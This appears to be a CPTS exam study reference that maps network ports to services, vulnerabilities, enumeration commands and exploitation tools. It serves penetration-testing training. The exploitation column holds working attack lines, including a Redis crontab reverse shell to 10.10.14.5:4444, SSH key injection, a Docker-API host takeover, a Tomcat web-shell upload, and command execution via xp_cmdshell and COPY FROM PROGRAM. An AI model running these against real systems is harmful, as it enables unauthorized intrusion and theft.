# Port Reference

> **Full port reference** for the CPTS exam. Each entry covers: port, protocol, service, common vulnerabilities, enumeration commands, and exploitation tools.

---

## Port Table

| Port | Protocol | Service | Common Vulns | Enumeration Commands | Exploitation Tools |
|------|----------|---------|-------------|---------------------|-------------------|
| **21** | TCP | FTP | Anonymous login, weak creds, vsFTPd backdoor (CVE-2011-0762), FTP bounce scan, plaintext creds | `ftp <target>`, `nmap -p 21 --script ftp-anon,ftp-bounce -Pn <target>`, `curl -u anonymous:anonymous ftp://<target>/`, `wget -r ftp://anonymous:@<target>/` | `hydra -l admin -P rockyou.txt ftp://<target>`, `searchsploit ftp`, Metasploit `auxiliary/scanner/ftp/ftp_login` |
| **22** | TCP | SSH | Weak creds, weak key exchange algorithms, CVE-2024-6387 (regreSSHion), CVE-2018-15473 (user enum), SSH key reuse | `nc -nv <target> 22`, `ssh-audit <target>`, `nmap -p 22 --script ssh2-enum-algos,ssh-hostkey,ssh-auth-methods -Pn <target>`, `nmap -p 22 --script ssh-brute --script-args userdb=users.txt,passdb=passwords.txt -Pn <target>` | `hydra -l root -P rockyou.txt ssh://<target>`, `crowbar -b ssh -u user -C pass.txt -S <target>`, `ssh -i key user@<target>`, `searchsploit openssh` |
| **23** | TCP | Telnet | Cleartext traffic, no encryption, weak creds, CVE-2019-1221 | `nc -nv <target> 23`, `nmap -p 23 --script telnet-encryption,telnet-ntlm -Pn <target>` | `hydra -l admin -P rockyou.txt telnet://<target>`, Metasploit `auxiliary/scanner/telnet/telnet_login` |
| **25** | TCP | SMTP | User enum (VRFY/EXPN/RCPT TO), open relay, shellshock (on old servers), weak creds | `nc -nv <target> 25`, VRFY root / EXPN root / RCPT TO, `smtp-user-enum -M VRFY -U users.txt -t <target>`, `nmap -p 25 --script smtp-commands,smtp-enum-users,smtp-open-relay -Pn <target>`, `swaks --to test@<target> --server <target>` | `smtp-user-enum`, `swaks` (send test email), Metasploit `auxiliary/scanner/smtp/smtp_relay`, `auxiliary/scanner/smtp/smtp_enum` |
| **53** | TCP/UDP | DNS | Zone transfer, cache poisoning, subdomain takeover, DNS amplification, DDoS | `dig axfr @<target> <domain>`, `dig any <domain> @<target>`, `nslookup -type=any <domain> <target>`, `dnsrecon -d <domain> -t axfr -n <target>`, `dnsenum --dnsserver <target> -f subdomains.txt <domain>`, `fierce --domain <domain> --dns-servers <target>`, `nmap -p 53 --script dns-zone-transfer,dns-brute,dns-srv-enum -Pn <target>` | `dnsrecon -t axfr`, `dnsenum`, `fierce`, `subfinder -d <domain>`, Metasploit `auxiliary/gather/dns_enum` |
| **80/443** | TCP | HTTP/S | SQLi, XSS, LFI/RFI, SSRF, SSTI, command injection, file upload, directory traversal, default creds, CMS vulns, insecure config | `whatweb <url>`, `curl -IL <url>`, `browser`, `ffuf -u <url>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt`, `gobuster dir -u <url> -w common.txt -x php,html,txt`, `nikto -h <url>`, `nuclei -u <url>`, `nmap -p 80,443 --script http-headers,http-enum,http-webdav-scan -Pn <target>`, `wpscan --url <url>` | Burp Suite, `sqlmap`, `hydra` (web forms), Metasploit web modules, `wpscan`, `joomscan`, `droopescan`, `xsstrike`, `commix` |
| **88** | TCP | Kerberos | No pre-auth (AS-REP roasting), Kerberoasting (TGS-REP), SMB relay via Kerberos, MS14-068 | `nmap -p 88 --script krb5-enum-users -Pn <target> --script-args krb5-enum-users.realm='DOMAIN.LOCAL'`, `kerbrute userenum -d domain.local --dc <target> users.txt` | `impacket-GetNPUsers`, `impacket-GetUserSPNs`, `impacket-ticketer`, `Rubeus`, `kerbrute` |
| **110** | TCP | POP3 | Plaintext creds, weak auth | `nc -nv <target> 110`, USER user, PASS pass, `openssl s_client -connect <target>:995`, `nmap -p 110 --script pop3-capabilities,pop3-ntlm-info -Pn <target>` | `hydra -l user -P rockyou.txt pop3://<target>`, `telnet <target> 110` |
| **111** | TCP/UDP | RPC | NFS info leak, portmapper, RPC services enumeration | `rpcinfo -p <target>`, `nmap -p 111 --script rpcinfo -Pn <target>`, `rpcclient -U "" -N <target>` | NFS mount if NFS is registered |
| **135** | TCP | MSRPC (Microsoft RPC / Endpoint Mapper) | MS08-067, MS17-010 (via SMB), RPC endpoint enumeration | `rpcclient -U "" -N <target>`, `impacket-rpcdump <target>`, `nmap -p 135 --script msrpc-enum -Pn <target>`, `rpcdump.py <target>` | `rpcclient` enum users/groups, `impacket-rpcdump`, Metasploit `exploit/windows/smb/ms08_067_netapi` |
| **139/445** | TCP | SMB (NetBIOS / SMB over TCP) | EternalBlue (MS17-010), null session, guest access, SMB signing disabled (NTLM relay), SMBGhost (CVE-2020-0796), SMBleed, DFSCoerce, PetitPotam, Zerologon (CVE-2020-1472) | `smbclient -L //<target> -N`, `smbmap -H <target>`, `crackmapexec smb <target> -u '' -p '' --shares`, `enum4linux -a <target>`, `nmap -p 445 --script smb-enum-shares,smb-enum-users,smb-os-discovery,smb-protocols,smb-security-mode,smb-vuln* -Pn <target>`, `rpcclient -U "" -N <target>`, `netexec smb <target> -u '' -p '' --shares` | `crackmapexec` / `netexec`, `impacket-smbexec`, `impacket-psexec`, `impacket-wmiexec`, Metasploit `exploit/windows/smb/ms17_010_*`, `nmap --script smb-vuln-ms17-010`, `impacket-ntlmrelayx`, `python3 zerologon.py`, `dementor.py`, `petitpotam.py` |
| **143** | TCP | IMAP | Plaintext creds, weak auth | `nc -nv <target> 143`, `openssl s_client -connect <target>:993`, `nmap -p 143 --script imap-capabilities,imap-ntlm-info -Pn <target>` | `hydra -l user -P rockyou.txt imap://<target>` |
| **161** | UDP | SNMP | Default community strings (public/private), info disclosure (users, processes, software, network info), writable SNMP | `snmpwalk -v2c -c public <target>`, `snmpwalk -v1 -c public <target> 1.3.6.1.4.1.77.1.2.25` (Windows users), `snmp-check <target>`, `onesixtyone -c community.txt <target>`, `nmap -p 161 --script snmp-* -sU -Pn <target>`, `snmpenum -c public <target>` | `snmp-check`, `snmpwalk`, `onesixtyone`, Metasploit `auxiliary/scanner/snmp/snmp_login`, SNMPset (if writable) |
| **389** | TCP/UDP | LDAP | Anonymous bind, information disclosure (full directory dump), credential disclosure in description fields | `ldapsearch -H ldap://<target> -x -b "dc=domain,dc=local" -s base`, `ldapsearch -H ldap://<target> -x -b "dc=domain,dc=local"`, `nmap -p 389 --script ldap-rootdse,ldap-search -Pn <target>`, `ldapdomaindump -u 'DOMAIN\\' -p '' <target>`, `windapsearch.py --dc-ip <target> -U`, `bloodhound-python -d domain.local -u '' -p '' -ns <target> -c All` | `ldapsearch`, `ldapdomaindump`, `windapsearch.py`, `bloodhound-python`, Metasploit `auxiliary/gather/ldap_query` |
| **443** | TCP | HTTPS | Same as 80 + SSL/TLS vulns (Heartbleed, POODLE, Log4j, insecure cipher suites) | `sslscan <target>`, `testssl.sh <target>`, `openssl s_client -connect <target>:443`, `nmap -p 443 --script ssl-heartbleed,ssl-enum-ciphers,tls-nextprotoneg -Pn <target>`, `nuclei -t ssl/ -u https://<target>` | Same as 80 + Heartbleed PoC, Log4j scanner |
| **464** | TCP/UDP | Kerberos (kpasswd) | Password change attacks, no pre-auth | `nmap -p 464 --script krb5-enum-users -Pn <target>` | `impacket-GetNPUsers`, `impacket-changepw` |
| **500** | UDP | ISAKMP (IKE / IPSec) | VPN fingerprinting, aggressive mode pre-shared key brute force, VPN 0-day | `ike-scan <target>`, `ike-scan -M -A <target>` (aggressive mode), `nmap -sU -p 500 --script ike-version -Pn <target>` | `ike-scan -P <file>` (dump PSK hash), hashcat `-m 5300`, `cisco-axe` |
| **593** | TCP | MSRPC over HTTP | Same as 135 (RPC over HTTP) | `impacket-rpcdump <target>`, `nmap -p 593 -Pn <target>` | Same as 135 |
| **636** | TCP | LDAPS | Same as 389 (LDAP over SSL) | `ldapsearch -H ldaps://<target> -x -b "dc=domain,dc=local"`, `nmap -p 636 --script ldap-search -Pn <target>` | Same as 389 |
| **873** | TCP | Rsync | Anonymous access, world-readable shares, no auth | `rsync -av --list-only rsync://<target>`, `rsync -av --list-only rsync://<target>/share`, `nmap -p 873 --script rsync-list-modules -Pn <target>` | `rsync -av rsync://<target>/share ./` (download), `rsync -av ./file rsync://<target>/share/` (upload) |
| **993** | TCP | IMAPS | Same as IMAP (encrypted) | `openssl s_client -connect <target>:993`, `nmap -p 993 --script imap-* -Pn <target>` | `hydra -l user -P rockyou.txt imaps://<target>` |
| **995** | TCP | POP3S | Same as POP3 (encrypted) | `openssl s_client -connect <target>:995`, `nmap -p 995 --script pop3-* -Pn <target>` | `hydra -l user -P rockyou.txt pop3s://<target>` |
| **1433** | TCP | MSSQL (Microsoft SQL Server) | Weak sa password, xp_cmdshell RCE, SQL injection, linked server attack, unauthenticated access | `nmap -p 1433 --script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password -Pn <target>`, `sqsh -S <target> -U sa`, `impacket-mssqlclient sa@<target>`, `crackmapexec mssql <target> -u sa -p ''`, `odbc -S <target> -U sa -P ''` | `impacket-mssqlclient`, enable xp_cmdshell: `EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;`, `EXEC xp_cmdshell 'whoami'`, Metasploit `auxiliary/admin/mssql/mssql_exec`, `crackmapexec mssql -M xp_cmdshell` |
| **1521** | TCP | Oracle (TNS Listener) | Default SID/password, TNS poisoning (CVE-2012-1675), Oracle 0-day RCE, weak account passwords | `nmap -p 1521 --script oracle-sid-brute,oracle-tns-version -Pn <target>`, `odat all -s <target>`, `tnscmd10g version -h <target>`, `oscanner -s <target> -P 1521` | `odat` (Oracle Database Attack Tool), `sidguesser`, `tnspoison`, Metasploit `auxiliary/admin/oracle/oracle_login`, `auxiliary/scanner/oracle/sid_enum` |
| **2049** | TCP/UDP | NFS (Network File System) | No_root_squash, world-readable exports, SUID abuse | `showmount -e <target>`, `mount -t nfs <target>:/share /mnt -o nolock,vers=3`, `nmap -p 2049 --script nfs-showmount,nfs-ls,nfs-statfs -Pn <target>` | `mount -t nfs <target>:/share /mnt`, `sudo mount -o vers=2 <target>:/ /mnt`, create SUID binary on no_root_squash shares |
| **2375** | TCP | Docker (REST API - unencrypted) | Unauthenticated Docker remote API RCE | `docker -H tcp://<target>:2375 ps`, `curl http://<target>:2375/containers/json`, `nmap -p 2375 --script docker-* -Pn <target>` | `docker -H tcp://<target>:2375 run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh`, `docker -H tcp://<target>:2375 exec -it <container> /bin/sh` |
| **2376** | TCP | Docker (REST API - TLS) | Same as 2375 but needs client certs | Same as 2375 (with TLS flags) | Same as 2375 with `--tls`, `--tlscacert`, `--tlscert`, `--tlskey` |
| **3306** | TCP | MySQL | No password for root, weak creds, UDF injection, LOAD DATA LOCAL | `mysql -h <target> -u root`, `mysql -h <target> -u root -p'root'`, `nmap -p 3306 --script mysql-empty-password,mysql-users,mysql-databases,mysql-variables,mysql-audit -Pn <target>`, `crackmapexec mysql <target> -u root -p ''` | `mysql -u root -p'root'`, UDF injection: `CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'udf.dll'`, Metasploit `auxiliary/admin/mysql/mysql_sql`, `auxiliary/scanner/mysql/mysql_login` |
| **3389** | TCP | RDP (Remote Desktop Protocol) | BlueKeep (CVE-2019-0708), weak creds, NLA bypass, RDP man-in-the-middle, CVE-2024-21899 (Windows RDP) | `xfreerdp /v:<target>`, `rdesktop <target>`, `nmap -p 3389 --script rdp-vuln-ms12-020,rdp-ntlm-info,rdp-enum-encryption -Pn <target>`, `crackmapexec rdp <target> -u users.txt -p passwords.txt`, `crowbar -b rdp -u user -C pass.txt -S <target>` | Metasploit `auxiliary/scanner/rdp/rdp_scanner`, `exploit/windows/rdp/cve_2019_0708_bluekeep_rce`, `crowbar`, `hydra`, `xfreerdp` |
| **3632** | TCP | Distcc (Distributed Compiler) | Distcc daemon RCE (CVE-2004-2687) | `nmap -p 3632 --script distcc-cve2004-2687 -Pn <target>`, `nc -nv <target> 3632` | `searchsploit distcc`, Metasploit `exploit/unix/misc/distcc_exec`, `distccd --scan` |
| **3690** | TCP | SVN (Subversion) | Anonymous access, credential disclosure | `svn info svn://<target>/repo`, `svn ls svn://<target>`, `nmap -p 3690 -Pn <target>` | `svn checkout svn://<target>/repo`, `svn export svn://<target>/repo` |
| **4369** | TCP | Erlang Port Mapper Daemon (EPMD) | Erlang cookie attack, Erlang RPC | `epmd -names -host <target>`, `nmap -p 4369 -Pn <target>` | Erlang cookie RCE (if cookie known/default), Metasploit `exploit/multi/erlang/erlang_cookie_rce` |
| **5432** | TCP | PostgreSQL | Weak creds, superuser RCE via COPY FROM PROGRAM, file read via COPY | `psql -h <target> -U postgres`, `nmap -p 5432 --script pgsql-brute --script-args userdb=users.txt,passdb=passwords.txt -Pn <target>`, `crackmapexec postgres <target> -u postgres -p ''` | `psql -h <target> -U postgres`, RCE: `CREATE TABLE cmd (output text); COPY cmd FROM PROGRAM 'whoami'; SELECT * FROM cmd;`, file read: `CREATE TABLE files (data text); COPY files FROM '/etc/passwd'; SELECT * FROM files;`, Metasploit `auxiliary/admin/postgres/postgres_sql` |
| **5900** | TCP | VNC | No authentication, weak auth, VNC brute force | `vncviewer <target>`, `nmap -p 5900 --script vnc-info,vnc-title -Pn <target>`, `vncsnapshot <target>:5900 out.jpg` | `vncviewer <target>`, `vncpwn`, Metasploit `auxiliary/scanner/vnc/vnc_login`, `auxiliary/admin/vnc/vnc_view_only` |
| **5985** | TCP | WinRM (HTTP) | Weak creds, pass-the-hash, no transport encryption | `crackmapexec winrm <target> -u users.txt -p passwords.txt`, `evil-winrm -i <target> -u user -p 'password'`, `nmap -p 5985 --script http-winrm-* -Pn <target>`, `ruby winrm_shell.rb <target> user password` | `evil-winrm`, `crackmapexec winrm -u user -p 'password' -x whoami`, `impacket-wmiexec`, Metasploit `exploit/windows/winrm/winrm_script_exec` |
| **5986** | TCP | WinRM (HTTPS) | Same as 5985 with SSL | Same as 5985 + `evil-winrm -i <target> -S` | Same as 5985 + `-S` flag |
| **6379** | TCP | Redis | No authentication, default creds, SSH key injection, crontab RCE, web shell injection | `redis-cli -h <target> info`, `redis-cli -h <target> ping`, `nmap -p 6379 --script redis-info -Pn <target>` | SSH key injection: `redis-cli -h <target> config set dir /root/.ssh; config set dbfilename authorized_keys; set key "\n\n\n$(cat ~/.ssh/id_rsa.pub)\n\n\n"; save`, crontab RCE: `config set dir /var/spool/cron; config set dbfilename root; set payload "\n\n* * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'\n\n"; save`, Metasploit `exploit/linux/redis/redis_replication` |
| **7001** | TCP | WebLogic | CVE-2017-10271 (XMLDecoder RCE), CVE-2018-2628 (T3 protocol RCE), CVE-2019-2725, CVE-2020-14645, console default creds | `nmap -p 7001 --script http-headers -Pn <target>`, `curl http://<target>:7001/console/login/LoginForm.jsp`, `whatweb http://<target>:7001` | `searchsploit weblogic`, Metasploit `exploit/multi/http/weblogic_wls_wsat_deserialization_rce`, `weblogicScanner.py`, `CVE-2017-10271` XMLDecoder exploit |
| **8080** | TCP | HTTP Alternate | Same as 80/443 + often Tomcat, Jenkins, Jira, or other Java apps with default creds | Same as 80 + check `/manager/html` (Tomcat), `/jenkins`, `ffuf -u http://<target>:8080/FUZZ`, `nmap -p 8080 --script http-* -Pn <target>` | Tomcat Manager deploy WAR: `curl -u tomcat:tomcat http://<target>:8080/manager/deploy?path=/shell --upload-file shell.war`, Jenkins script console RCE, Metasploit `exploit/multi/http/tomcat_mgr_upload` |
| **8443** | TCP | HTTPS Alternate | Same as 443 + often alternative HTTPS port | Same as 443 | Same as 443 |
| **9200** | TCP | Elasticsearch | Unauthenticated REST API, data exposure, CVE-2014-3120 (RCE via MVEL), CVE-2015-1427 (RCE via Groovy) | `curl http://<target>:9200`, `curl http://<target>:9200/_cat/indices?v`, `curl http://<target>:9200/_search?pretty&q=password`, `nmap -p 9200 --script http-headers -Pn <target>`, `es-cli --host <target> indices` | `curl http://<target>:9200/_search?pretty`, Metasploit `exploit/multi/elasticsearch/script_mvel_rce`, search for passwords in indices |
| **27017** | TCP | MongoDB | No authentication, data exposure | `mongosh mongodb://<target>:27017`, `mongo <target>:27017`, `nmap -p 27017 --script mongodb-databases,mongodb-info -Pn <target>`, `metasploit auxiliary/scanner/mongodb/mongodb_login` | `mongo <target>:27017`, `show dbs; use admin; db.getUsers();`, Dump all: `mongodump --host <target>`, NoSQL injection if web app uses MongoDB |
| **50070** | TCP | Hadoop HDFS (NameNode) | Unauthenticated HDFS admin interface, data exposure | `curl http://<target>:50070/explorer.html`, `curl http://<target>:50070/webhdfs/v1/?op=LISTSTATUS`, `nmap -p 50070 -Pn <target>` | Browse HDFS via web UI, `curl http://<target>:50070/webhdfs/v1/`, Metasploit `auxiliary/admin/hadoop/hadoop_webhdfs_rce` |

---

## Quick Scan Commands by Port

```bash
# All-in-one service scan (replace PORT and TARGET)
nmap -p <PORT> -sC -sV -Pn -oA service_PORT <TARGET>

# Example
nmap -p 445 -sC -sV -Pn --script smb-enum-shares,smb-vuln-ms17-010 -oA smb_scan 10.10.10.10
```

## Nmap Category Scripts

```bash
# For specific port categories:
nmap -p 21,22,80,443 --script "default or safe" -Pn <target>  # Safe scripts
nmap -p 445,139 --script "smb-*" -Pn <target>                  # All SMB scripts
nmap -p 3306,1433,5432 --script "ms-sql-* or mysql-* or pgsql-*" -Pn <target>
nmap -p 80,443,8080 --script "http-*" -Pn <target>             # All HTTP scripts
nmap -p 161 --script "snmp-*" -sU -Pn <target>                 # SNMP scripts
```

## Port Discovery Methodology

```bash
# 1. Quick all-ports TCP
nmap -p- --min-rate=1000 -T4 -Pn -oA full_tcp <target>

# 2. Extract open ports
PORTS=$(grep -oP '\d+/open/tcp' full_tcp.gnmap | cut -d/ -f1 | tr '\n' ',' | sed 's/,$//')

# 3. Deep service scan on open ports
nmap -p $PORTS -sC -sV -Pn -oA deep_scan <target>

# 4. UDP top-20
nmap -sU --top-ports 20 -Pn -oA udp_scan <target>
```

## Service Interaction Quick Reference

```bash
# FTP
ftp <target>                    # interactive
wget -m ftp://anonymous:@<target>/  # download all

# SSH
ssh user@<target>
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 user@<target>  # legacy

# SMB
smbclient -L //<target> -N       # null session
smbmap -H <target>               # smbmap
crackmapexec smb <target> -u user -p 'password'  # cme
mount -t cifs //<target>/share /mnt -o user=guest  # mount

# LDAP
ldapsearch -H ldap://<target> -x -b "dc=domain,dc=local"

# DNS
dig axfr @<target> <domain>

# SNMP
snmpwalk -v2c -c public <target>
snmpwalk -v2c -c public <target> 1.3.6.1.4.1.77.1.2.25  # Windows users

# NFS
showmount -e <target>
mount -t nfs <target>:/share /mnt -o nolock

# MSSQL
impacket-mssqlclient sa@<target> -windows-auth
sqsh -S <target> -U sa

# MySQL
mysql -h <target> -u root -p'root'

# PostgreSQL
psql -h <target> -U postgres

# Redis
redis-cli -h <target>

# WinRM
evil-winrm -i <target> -u user -p 'password'

# RDP
xfreerdp /v:<target> /u:user /p:password
```

*See also: [[00 - Methodology and Workflow/CPTS Methodology]], [[00 - Methodology and Workflow/Quick Reference Card]]*
